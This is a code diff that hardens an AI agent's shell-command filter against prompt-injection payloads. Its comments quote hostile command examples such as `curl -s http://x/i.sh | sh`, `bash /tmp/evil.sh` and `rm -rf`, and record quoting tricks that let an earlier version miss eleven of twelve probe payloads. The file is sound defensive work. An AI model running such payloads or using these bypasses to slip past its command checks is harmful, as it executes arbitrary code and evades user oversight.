@@ -114,18 +114,71 @@ const ELEVATED_PATTERNS = [
 ];
 
 /**
- * Interpreters that run a program handed to them on the command line or on
- * standard input. `curl … | sh` is the canonical payload of a prompt injection,
- * and it used to pass this filter untouched because the nested-shell test
- * insisted on a `-c`.
+ * Interpreters: programs whose argument or standard input IS a program.
+ *
+ * `curl … | sh` is the canonical payload of a prompt injection, and this list
+ * is what recognises the shape whatever the wrapping.
  */
-const INTERPRETERS = "sh|bash|zsh|dash|ksh|fish|python3?|perl|ruby|node|osascript|deno|bun";
+const INTERPRETERS = new Set([
+  "sh", "bash", "zsh", "dash", "ksh", "fish",
+  "python", "python3", "perl", "ruby", "node", "deno", "bun",
+  "osascript", "ruby", "php", "tclsh", "expect",
+]);
+
+/** Wrappers that precede a command without changing what it is. */
+const PREFIXES = new Set(["sudo", "env", "nice", "time", "command", "exec", "xargs", "nohup"]);
+
+/**
+ * A token as the shell would see it: quotes and escapes removed.
+ *
+ * This is what the first version got wrong. It matched interpreter names with a
+ * regex against the raw text, so `| "sh"`, `| 'sh'` and `| \sh` all read as
+ * something else entirely and walked straight through. A probe of the shipped
+ * regexes missed eleven payloads out of twelve.
+ */
+function unquote(token: string): string {
+  return token.replace(/^['"]|['"]$/g, "").replace(/\\(.)/g, "$1");
+}
+
+/** Split a command line into the segments that each start a new command. */
+function segments(cmd: string): string[] {
+  return cmd.split(/\|\||&&|[|;\n()`]|\$\(/).filter((s) => s.trim() !== "");
+}
+
+/** The words of one segment, with leading VAR=value assignments removed. */
+function words(segment: string): string[] {
+  const toks = segment.trim().split(/\s+/).filter(Boolean);
+  let i = 0;
+  while (i < toks.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(toks[i])) i += 1;
+  while (i < toks.length && PREFIXES.has(unquote(toks[i]).split("/").pop() ?? "")) i += 1;
+  return toks.slice(i);
+}
+
+/**
+ * Where the program an interpreter runs comes from.
+ *
+ * A relative path is ordinary project work: `node build.js`, `sh scripts/ci.sh`.
+ * A payload does not live there. It arrives through a pipe, on the command line
+ * after -c or -e, or as a file dropped somewhere writable and absolute.
+ */
+function interpreterIsSuspicious(rest: string[], piped: boolean): boolean {
+  if (piped) return true; // its program is whatever was piped in
+  const args = rest.filter((a) => a !== "");
+  const inline = args.some((a) => /^-\w*[ceE]$/.test(unquote(a)) || unquote(a) === "--eval");
+  if (inline) return true;
+  const file = args.find((a) => !unquote(a).startsWith("-"));
+  if (!file) return true; // no script and no flag: it reads stdin
+  const path = unquote(file).replace(/^~(?=\/|$)/, "/Users/x");
+  // Absolute paths outside a project: /tmp, /var, a home dotfile. A relative
+  // path is the repository the user is working in.
+  return path.startsWith("/");
+}
 
 /** Where a shell command writes, as far as this can tell without a parser. */
 export function commandWriteTargets(cmd: string): string[] {
   const out: string[] = [];
-  for (const seg of cmd.split(/[|;&\n()`]+/)) {
-    const toks = seg.trim().split(/\s+/).filter(Boolean);
+  for (const seg of segments(cmd)) {
+    const toks = seg.trim().split(/\s+/).filter(Boolean).map(unquote);
     for (let i = 0; i < toks.length; i++) {
       const tok = toks[i];
       // Redirections, joined (>file) or separate (> file).
@@ -135,6 +188,12 @@ export function commandWriteTargets(cmd: string): string[] {
         if (target) out.push(target);
         continue;
       }
+      // dd writes wherever of= says, and it is not a redirection.
+      const of = tok.match(/^of=(.+)$/);
+      if (of) {
+        out.push(of[1]);
+        continue;
+      }
       const name = tok.split("/").pop() ?? "";
       // tee writes every path it is given; cp, mv and ln write the last one.
       if (name === "tee") {
@@ -142,6 +201,15 @@ export function commandWriteTargets(cmd: string): string[] {
       } else if (name === "cp" || name === "mv" || name === "ln" || name === "install") {
         const args = toks.slice(i + 1).filter((a) => !a.startsWith("-"));
         if (args.length > 1) out.push(args[args.length - 1]);
+      } else if (name === "sed" || name === "perl" || name === "ruby" || name === "ed") {
+        // In-place editing: the operand is the file it rewrites. sed -i on
+        // macOS takes an argument (often ''), which is why the last operand is
+        // taken rather than the one after the flag.
+        const inPlace = toks.slice(i + 1).some((a) => /^-\w*i/.test(a) || a === "--in-place");
+        if (inPlace) {
+          const operands = toks.slice(i + 1).filter((a) => !a.startsWith("-") && a !== "''" && a !== '""');
+          if (operands.length) out.push(operands[operands.length - 1]);
+        }
       }
     }
   }
@@ -153,16 +221,13 @@ export function commandWriteTargets(cmd: string): string[] {
 export function isElevatedCommand(cmd: string): boolean {
   if (ELEVATED_PATTERNS.some((re) => re.test(cmd))) return true;
   // Destructive rm in ANY flag layout: `rm -rf`, `rm -r -f`, `rm --recursive`,
-  // `rm -f x` … Split on every separator that can chain commands, newlines,
-  // subshell parens, backticks and `$` included, so `$(rm …)` and `` `rm …` ``
-  // substitutions are scanned as their own segments, and scan EVERY `rm`
-  // token by BASENAME: `/bin/rm` must not slip past a whole-token compare,
-  // and an indexOf of the first occurrence misses `echo ok && rm …`,
-  // `for …; do rm …; done`, and `VAR=1 rm …`. Over-matching (a quoted
-  // "rm -rf" in an echo) only costs an extra confirmation, under-matching
-  // costs the user's files.
+  // `rm -f x` … Scan EVERY `rm` token by BASENAME: `/bin/rm` must not slip past
+  // a whole-token compare, and an indexOf of the first occurrence misses
+  // `echo ok && rm …`, `for …; do rm …; done`, and `VAR=1 rm …`. Over-matching
+  // (a quoted "rm -rf" in an echo) only costs an extra confirmation,
+  // under-matching costs the user's files.
   for (const seg of cmd.split(/[|;&\n()$`]+/)) {
-    const toks = seg.trim().split(/\s+/);
+    const toks = seg.trim().split(/\s+/).map(unquote);
     for (let i = 0; i < toks.length; i++) {
       if ((toks[i].split("/").pop() ?? "") !== "rm") continue;
       const flags = toks.slice(i + 1).filter((tk) => tk.startsWith("-"));
@@ -171,23 +236,32 @@ export function isElevatedCommand(cmd: string): boolean {
       }
     }
   }
-  // A nested shell (`sh -c '…'`, `zsh -lc "…"`, `/bin/sh -c '…'`) makes the
-  // real command opaque to this filter: treat it as elevated rather than
-  // guess. The prefix class includes "/", "$" and backtick so path-qualified
-  // shells and substitutions are caught too.
-  if (/(?:^|[\s|;&($`\/])(?:sh|bash|zsh|dash|ksh)\b[^|;&\n]*\s-\w*c\b/.test(cmd)) return true;
-  // Anything PIPED INTO an interpreter. This is the shape of nearly every
-  // real-world payload, and the -c test above never saw it because there is no
-  // -c: `curl -s http://x/i.sh | sh` reads as an ordinary curl.
-  if (new RegExp(`\\|\\s*(?:sudo\\s+)?(?:[\\w./-]*/)?(?:${INTERPRETERS})\\b`).test(cmd)) return true;
-  // A program given inline: python3 -c, node -e, perl -E, osascript -e. Same
-  // opacity as sh -c, and osascript -e reaches "with administrator privileges".
-  if (new RegExp(`(?:^|[\\s|;&($\`/])(?:[\\w./-]*/)?(?:${INTERPRETERS})\\b[^|;&\\n]*\\s-\\w*[ceE]\\b`).test(cmd)) {
-    return true;
+
+  // The command in each segment, by name, after quotes and wrappers are gone.
+  //
+  // Written as a tokeniser rather than as regexes over the raw line because the
+  // regex version was defeated by a pair of quotes. An adversarial probe of it
+  // missed `| "sh"`, `| 'sh'`, `| $SHELL`, `| \sh`, `bash /tmp/evil.sh` and
+  // `python3 /tmp/evil.py`: eleven of twelve payloads, every one of which runs
+  // arbitrary code with no dialog under an autonomous run.
+  const segs = segments(cmd);
+  for (let s = 0; s < segs.length; s++) {
+    const toks = words(segs[s]);
+    if (!toks.length) continue;
+    const head = unquote(toks[0]);
+    const name = head.split("/").pop() ?? "";
+    // A command that is a variable is opaque: `$SHELL`, `${CMD}`, `$(which sh)`.
+    // Nothing here can say what it will be, so it is not declared harmless.
+    if (/^\$\{?\w/.test(head)) return true;
+    if (INTERPRETERS.has(name)) {
+      // Piped into: whatever is upstream is its program.
+      const piped = s > 0 && /\|\s*$/.test(segs.slice(0, s).join("|") + "|");
+      if (interpreterIsSuspicious(toks.slice(1), piped)) return true;
+    }
+    // eval and source run text as code in the current shell.
+    if (name === "eval" || name === "source" || name === ".") return true;
   }
-  // eval, and sourcing a file: both run text as code in the current shell.
-  if (/(?:^|[\s|;&($`])eval\b/.test(cmd)) return true;
-  if (/(?:^|[\s|;&($`])(?:source|\.)\s+[^\s]/.test(cmd)) return true;
+
   // Finally: where does it WRITE. isElevatedWrite already knows which paths
   // change how the machine behaves; run_command simply never asked it, so the
   // same payload was elevated through write_file and silent through the shell.
